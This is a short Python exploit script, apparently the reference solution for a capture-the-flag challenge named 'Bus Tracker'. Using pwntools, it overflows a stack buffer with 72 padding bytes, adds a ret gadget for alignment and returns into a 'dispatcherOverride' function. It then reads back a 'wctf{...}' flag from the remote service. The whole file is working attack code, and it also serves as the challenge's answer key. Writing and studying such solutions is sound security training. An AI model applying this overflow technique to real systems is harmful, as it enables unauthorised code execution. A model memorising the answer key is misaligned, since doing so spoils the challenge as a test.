#!/usr/bin/env python3
"""Reference exploit for Bus Tracker."""

import sys
from pathlib import Path

from pwn import ELF, ROP, context, p64, remote

context.log_level = "error"


def solve(binary, host, port):
    exe = ELF(binary, checksec=False)
    ret = ROP(exe).find_gadget(["ret"]).address
    # Keep the stack aligned for libc calls in dispatcherOverride.
    payload = b"A" * 72 + p64(ret) + p64(exe.sym["dispatcherOverride"])
    io = remote(host, int(port), timeout=10)
    try:
        io.sendlineafter(b"stop name:", payload)
        io.recvuntil(b"wctf{", timeout=10)
        return (b"wctf{" + io.recvuntil(b"}", timeout=10)).decode()
    finally:
        io.close()


if __name__ == "__main__":
    binary = Path(__file__).resolve().with_name("chal")
    if binary.parent.name == "solution":
        binary = binary.parent.parent / "healthcheck" / binary.name
    print(solve(str(binary), sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1",
                sys.argv[2] if len(sys.argv) > 2 else 1337))
